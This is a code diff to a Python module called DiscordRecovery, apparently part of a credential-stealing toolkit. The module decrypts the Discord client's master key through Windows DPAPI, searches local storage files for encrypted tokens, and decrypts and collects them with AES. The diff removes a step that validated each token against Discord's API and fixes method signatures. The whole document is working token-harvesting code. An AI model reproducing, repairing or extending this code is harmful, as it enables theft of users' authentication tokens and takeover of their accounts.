@@ -8,8 +8,6 @@ from ctypes import Structure
 from ctypes import POINTER
 from ctypes import c_char
 from ctypes import c_buffer
-from urllib.request import Request
-from urllib.request import urlopen
 from Crypto.Cipher import AES
 from base64 import b64decode
 from json import loads as json_loads
@@ -66,19 +64,8 @@ class DiscordRecovery(ModuleManager):
         if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
             return self.GetData(blob_out)
 
-    def checkToken(token):
-        headers = {
-            "Authorization": token,
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-        }
-        try:
-            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
-            return True
-        except:
-            return False
-    
-    def DecryptValue(buff, master_key=None):
+
+    def DecryptValue(self, buff, master_key=None):
         starts = buff.decode(encoding='utf8', errors='ignore')[:3]
         if starts == 'v10' or starts == 'v11':
             iv = buff[3:15]
@@ -88,7 +75,7 @@ class DiscordRecovery(ModuleManager):
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
 
-    def GetDiscord(path, arg):
+    def GetDiscord(self, path, arg):
         if not os.path.exists(f"{path}/Local State"):
             return
 
@@ -98,7 +85,7 @@ class DiscordRecovery(ModuleManager):
         with open(pathKey, 'r', encoding='utf-8') as f:
             local_state = json_loads(f.read())
         master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-        master_key = CryptUnprotectData(master_key[5:])
+        master_key = self.CryptUnprotectData(master_key[5:])
         # print(path, master_key)
 
         for file in os.listdir(pathC):
@@ -107,12 +94,11 @@ class DiscordRecovery(ModuleManager):
                 for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                     for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                         global Tokens
-                        tokenDecoded = DecryptValue(
+                        tokenDecoded = self.DecryptValue(
                             b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
-                        if checkToken(tokenDecoded):
-                            if not tokenDecoded in Tokens:
-                                Tokens += tokenDecoded
-                                print(tokenDecoded, path)
+                        if not tokenDecoded in Tokens:
+                            Tokens += tokenDecoded
+                            print(tokenDecoded, path)
 
     
     def run(self):
